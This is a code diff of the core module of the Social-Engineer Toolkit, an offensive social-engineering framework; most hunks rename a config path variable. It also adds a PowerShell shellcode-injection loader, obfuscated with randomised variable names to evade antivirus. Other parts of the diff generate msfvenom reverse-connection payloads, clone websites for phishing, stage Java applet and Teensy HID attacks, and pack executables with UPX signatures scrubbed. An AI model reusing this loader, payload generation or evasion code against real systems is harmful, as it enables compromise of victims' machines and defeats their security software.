@@ -428,48 +428,33 @@ def meta_database():
 #
 def grab_ipaddress():
     try:
-        fileopen = open("/etc/setoolkit/set.config", "r").readlines()
-        for line in fileopen:
-            line = line.rstrip()
-            match = re.search("AUTO_DETECT=ON", line)
-            if match:
-                try:
-                    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    rhost.connect(('google.com', 0))
-                    rhost.settimeout(2)
-                    rhost = rhost.getsockname()[0]
-                    return rhost
-                except Exception:
-                    rhost = raw_input(
-                        setprompt("0", "Enter your interface IP Address"))
-                    while 1:
-                        # check if IP address is valid
-                        ip_check = is_valid_ip(rhost)
-                        if ip_check == False:
-                            rhost = raw_input(
-                                "[!] Invalid ip address try again: ")
-                        if ip_check == True:
-                            break
-                    return rhost
+        rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        rhost.connect(('google.com', 0))
+        rhost.settimeout(2)
+        revipaddr = rhost.getsockname()[0]
+        rhost = raw_input(setprompt("0", "IP address or URL (www.ex.com) for the payload listener (LHOST) [" + revipaddr + "]"))
+        if rhost == "": rhost = revipaddr
 
-        # if AUTO_DETECT=OFF prompt for IP Address
-            match1 = re.search("AUTO_DETECT=OFF", line)
-            if match1:
-                rhost = raw_input(
-                    setprompt("0", "IP address for the payload listener (LHOST)"))
-                while 1:
-                        # check if IP address is valid
-                    ip_check = is_valid_ip(rhost)
-                    if ip_check == False:
-                        rhost = raw_input("[!] Invalid ip address try again: ")
-                    if ip_check == True:
+    except Exception:
+        rhost = raw_input(setprompt("0", "Enter your interface/reverse listener IP Address or URL"))
+
+    if validate_ip(rhost) == False:
+        while 1:
+            choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
+            if choice == "" or choice.lower() == "y":
+                print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
+                break
+            else:
+                rhost = raw_input(setprompt(["2"], "IP address for the reverse connection [" + rhost + "]"))
+                if validate_ip(rhost) == True: break
+                else:
+                    choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
+                    if choice == "" or choice.lower() == "y":
+                        print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                         break
-                return rhost
 
-    except Exception as e:
-        print_error("ERROR:Something went wrong:")
-        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
-
+    # rhost return when verified
+    return rhost
 
 #
 # cleanup old or stale files
@@ -478,11 +463,11 @@ def cleanup_routine():
     try:
         # restore original Java Applet
         shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
-                        (definepath()), setdir + "/Signed_Update.jar")
+                        (definepath()), userconfigpath + "Signed_Update.jar")
         if os.path.isfile("newcert.pem"):
             os.remove("newcert.pem")
-        if os.path.isfile(setdir + "/interfaces"):
-            os.remove(setdir + "/interfaces")
+        if os.path.isfile(userconfigpath + "interfaces"):
+            os.remove(userconfigpath + "interfaces")
         if os.path.isfile("src/html/1msf.raw"):
             os.remove("src/html/1msf.raw")
         if os.path.isfile("src/html/2msf.raw"):
@@ -491,10 +476,10 @@ def cleanup_routine():
             os.remove("msf.exe")
         if os.path.isfile("src/html/index.html"):
             os.remove("src/html/index.html")
-        if os.path.isfile(setdir + "/Signed_Update.jar"):
-            os.remove(setdir + "/Signed_Update.jar")
-        if os.path.isfile(setdir + "/version.lock"):
-            os.remove(setdir + "/version.lock")
+        if os.path.isfile(userconfigpath + "Signed_Update.jar"):
+            os.remove(userconfigpath + "Signed_Update.jar")
+        if os.path.isfile(userconfigpath + "version.lock"):
+            os.remove(userconfigpath + "version.lock")
 
     except:
         pass
@@ -574,19 +559,19 @@ def generate_random_string(low, high):
 def site_cloner(website, exportpath, *args):
     grab_ipaddress()
     ipaddr = grab_ipaddress()
-    filewrite = open(setdir + "/interface", "w")
+    filewrite = open(userconfigpath + "interface", "w")
     filewrite.write(ipaddr)
     filewrite.close()
-    filewrite = open(setdir + "/ipaddr", "w")
+    filewrite = open(userconfigpath + "ipaddr", "w")
     filewrite.write(ipaddr)
     filewrite.close()
-    filewrite = open(setdir + "/site.template", "w")
+    filewrite = open(userconfigpath + "site.template", "w")
     filewrite.write("URL=" + website)
     filewrite.close()
     # if we specify a second argument this means we want to use java applet
     if args[0] == "java":
         # needed to define attack vector
-        filewrite = open(setdir + "/attack_vector", "w")
+        filewrite = open(userconfigpath + "attack_vector", "w")
         filewrite.write("java")
         filewrite.close()
     sys.path.append("src/webattack/web_clone")
@@ -601,7 +586,7 @@ def site_cloner(website, exportpath, *args):
 
     # copy the file to a new folder
     print_status("Site has been successfully cloned and is: " + exportpath)
-    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir,
+    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, userconfigpath,
                                                             exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 
@@ -681,7 +666,7 @@ def java_applet_attack(website, port, directory):
     if check_options != 0:
 
         # move the file to the specified directory and filename
-        subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir, directory, filename),
+        subprocess.Popen("cp %s/msf.exe %s/%s" % (userconfigpath, directory, filename),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     applet_name = check_options("APPLET_NAME=")
@@ -690,7 +675,7 @@ def java_applet_attack(website, port, directory):
 
     # lastly we need to copy over the signed applet
     subprocess.Popen(
-        "cp %s/Signed_Update.jar %s/%s" % (setdir, directory, applet_name),
+        "cp %s/Signed_Update.jar %s/%s" % (userconfigpath, directory, applet_name),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # start the web server by running it in the background
@@ -715,41 +700,41 @@ def teensy_pde_generator(attack_method):
     if attack_method == "beef":
         # specify the filename
         filename = open("src/teensy/beef.ino", "r")
-        filewrite = open(setdir + "/reports/beef.ino", "w")
+        filewrite = open(userconfigpath + "reports/beef.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (setdir))
+            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (userconfigpath))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
         filename = open("src/teensy/powershell_down.ino", "r")
-        filewrite = open(setdir + "/reports/powershell_down.ino", "w")
+        filewrite = open(userconfigpath + "reports/powershell_down.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (userconfigpath))
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
         filename = open("src/teensy/powershell_reverse.ino", "r")
-        filewrite = open(setdir + "/reports/powershell_reverse.ino", "w")
+        filewrite = open(userconfigpath + "reports/powershell_reverse.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (userconfigpath))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
         filename = open("src/teensy/java_applet.ino", "r")
-        filewrite = open(setdir + "/reports/java_applet.ino", "w")
+        filewrite = open(userconfigpath + "reports/java_applet.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (userconfigpath))
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
         filename = open("src/teensy/wscript.ino", "r")
-        filewrite = open(setdir + "/reports/wscript.ino", "w")
+        filewrite = open(userconfigpath + "reports/wscript.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (userconfigpath))
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
@@ -765,7 +750,7 @@ def teensy_pde_generator(attack_method):
         # specify the filename
         import src.teensy.binary2teensy
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (userconfigpath))
 
     print_status(teensy_string)
 #
@@ -826,10 +811,10 @@ def upx(path_to_file):
             "Packing the executable and obfuscating PE file randomly, one moment.")
         # packing executable
         subprocess.Popen(
-            "%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir, path_to_file),
+            "%s -9 -q -o %s/temp.binary %s" % (upx_path, userconfigpath, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
         # move it over the old file
-        subprocess.Popen("mv %s/temp.binary %s" % (setdir, path_to_file),
+        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
         # random string
@@ -837,7 +822,7 @@ def upx(path_to_file):
 
         # 4 upx replace - we replace 4 upx open the file
         fileopen = open(path_to_file, "rb")
-        filewrite = open(setdir + "/temp.binary", "wb")
+        filewrite = open(userconfigpath + "temp.binary", "wb")
 
         # read the file open for data
         data = fileopen.read()
@@ -845,7 +830,7 @@ def upx(path_to_file):
         filewrite.write(data.replace("UPX", random_string, 4))
         filewrite.close()
         # copy the file over
-        subprocess.Popen("mv %s/temp.binary %s" % (setdir, path_to_file),
+        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     time.sleep(3)
 
@@ -865,7 +850,7 @@ def show_banner(define_version, graphic):
 [---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
 [---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
                       Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
-                    Codename: '""" + bcolors.YELLOW + """Vault7""" + bcolors.ENDC + bcolors.BLUE + """'
+                   Codename: '""" + bcolors.YELLOW + """Blackout""" + bcolors.ENDC + bcolors.BLUE + """'
 [---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
@@ -888,13 +873,13 @@ def show_banner(define_version, graphic):
         version = ""
 
         def pull_version():
-            if not os.path.isfile(setdir + "/version.lock"):
+            if not os.path.isfile(userconfigpath + "version.lock"):
                 try:
 
                     url = (
                         'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/set.version')
                     version = urlopen(url).read().rstrip().decode('utf-8')
-                    filewrite = open(setdir + "/version.lock", "w")
+                    filewrite = open(userconfigpath + "version.lock", "w")
                     filewrite.write(version)
                     filewrite.close()
 
@@ -902,7 +887,7 @@ def show_banner(define_version, graphic):
                     version = "keyboard interrupt"
 
             else:
-                version = open(setdir + "/version.lock", "r").read()
+                version = open(userconfigpath + "version.lock", "r").read()
 
             if cv != version:
                 if version != "":
@@ -1394,7 +1379,7 @@ def check_config(param):
                 # remove any quotes or single quotes
                 line = line.replace('"', "")
                 line = line.replace("'", "")
-                line = line.split("=")
+                line = line.split("=", 1)
                 return line[1]
 
 # copy an entire folder function
@@ -1429,8 +1414,8 @@ def copyfolder(sourcePath, destPath):
 def check_options(option):
         # open the directory
     trigger = 0
-    if os.path.isfile(setdir + "/set.options"):
-        fileopen = open(setdir + "/set.options", "r").readlines()
+    if os.path.isfile(userconfigpath + "set.options"):
+        fileopen = open(userconfigpath + "set.options", "r").readlines()
         for line in fileopen:
             match = re.search(option, line)
             if match:
@@ -1448,13 +1433,13 @@ def check_options(option):
 
 def update_options(option):
         # if the file isn't there write a blank file
-    if not os.path.isfile(setdir + "/set.options"):
-        filewrite = open(setdir + "/set.options", "w")
+    if not os.path.isfile(userconfigpath + "set.options"):
+        filewrite = open(userconfigpath + "set.options", "w")
         filewrite.write("")
         filewrite.close()
 
     # remove old options
-    fileopen = open(setdir + "/set.options", "r")
+    fileopen = open(userconfigpath + "set.options", "r")
     old_options = ""
     for line in fileopen:
         match = re.search(option, line)
@@ -1462,7 +1447,7 @@ def update_options(option):
             line = ""
         old_options = old_options + line
     # append to file
-    filewrite = open(setdir + "/set.options", "w")
+    filewrite = open(userconfigpath + "set.options", "w")
     filewrite.write(old_options + "\n" + option + "\n")
     filewrite.close()
 
@@ -1527,41 +1512,39 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
-    # powershell command here, needs to be unicoded then base64 in order to
-    # use encodedcommand - this incorporates a new process downgrade attack
-    # where if it detects 64 bit it'll use x86 powershell. This is useful so
-    # we don't have to guess if its x64 or x86 and what type of shellcode to
-    # use
+
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = generate_random_string(3, 4)
-    var2 = generate_random_string(3, 4)
-    var3 = generate_random_string(3, 4)
-    var4 = generate_random_string(3, 4)
-    var5 = generate_random_string(3, 4)
-    var6 = generate_random_string(3, 4)
+    var1 = "$" + generate_random_string(2, 2) # $1 
+    var2 = "$" + generate_random_string(2, 2) # $c
+    var3 = "$" + generate_random_string(2, 2) # $2
+    var4 = "$" + generate_random_string(2, 2) # $3
+    var5 = "$" + generate_random_string(2, 2) # $x
+    var6 = "$" + generate_random_string(2, 2) # $t
+    var7 = "$" + generate_random_string(2, 2) # $h
+    var8 = "$" + generate_random_string(2, 2) # $z
+    var9 = "$" + generate_random_string(2, 2) # $g
+    var10 = "$" + generate_random_string(2, 2) # $i
+    var11 = "$" + generate_random_string(2, 2) # $w
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
 
     # run it through a lame var replace
-    powershell_command = powershell_code.replace("$1", "$" + var1).replace(
-        "$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
+        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
+        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
+        "$w", var11)
 
     # unicode and base64 encode and return it
-    return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
+    return base64.b64encode(powershell_code.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
-
-
 def generate_shellcode(payload, ipaddr, port):
-
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
-                            (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
@@ -1572,8 +1555,6 @@ def generate_shellcode(payload, ipaddr, port):
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
-
-
 def shellcode_replace(ipaddr, port, shellcode):
     # split up the ip address
     ip = ipaddr.split('.')
@@ -1790,7 +1771,7 @@ def setdir():
         return "src/program_junk/"
 
 # set the main directory for SET
-setdir = setdir()
+userconfigpath = setdir()
 
 # Copyright (c) 2007 Brandon Sterne
 # Licensed under the MIT license.
@@ -2044,7 +2025,7 @@ def input(string):
 
 
 def fetch_template():
-    fileopen = open(setdir + "/site.template").readlines()
+    fileopen = open(userconfigpath + "site.template").readlines()
     for line in fileopen:
         line = line.rstrip()
         match = re.search("URL=", line)
